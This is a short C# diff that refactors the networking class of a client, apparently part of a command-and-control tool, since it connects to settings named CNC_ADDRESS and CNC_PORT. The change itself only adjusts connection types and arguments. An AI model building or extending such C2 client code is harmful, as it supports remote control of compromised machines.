@@ -1,6 +1,7 @@
 ﻿using Client.Config;
 using Client.Core.Events;
 using Client.Core.Security;
+using NetworkCommsDotNet;
 using NetworkCommsDotNet.Connections;
 using NetworkCommsDotNet.Connections.TCP;
 using System;
@@ -13,7 +14,7 @@ namespace Client.Core.Networking
 {
     class NetworkManager
     {
-        public static TCPConnection Connection;
+        public static Connection Connection;
         public static bool IsConnected
         {
             get
@@ -24,7 +25,7 @@ namespace Client.Core.Networking
         
         public static void Connect()
         {
-            Connection = TCPConnection.GetConnection(new NetworkCommsDotNet.ConnectionInfo(Settings.CNC_ADDRESS, Settings.CNC_PORT), true);
+            Connection = TCPConnection.GetConnection(new NetworkCommsDotNet.ConnectionInfo(Settings.CNC_ADDRESS, Settings.CNC_PORT));
             SetupHandlers();
         }   
 
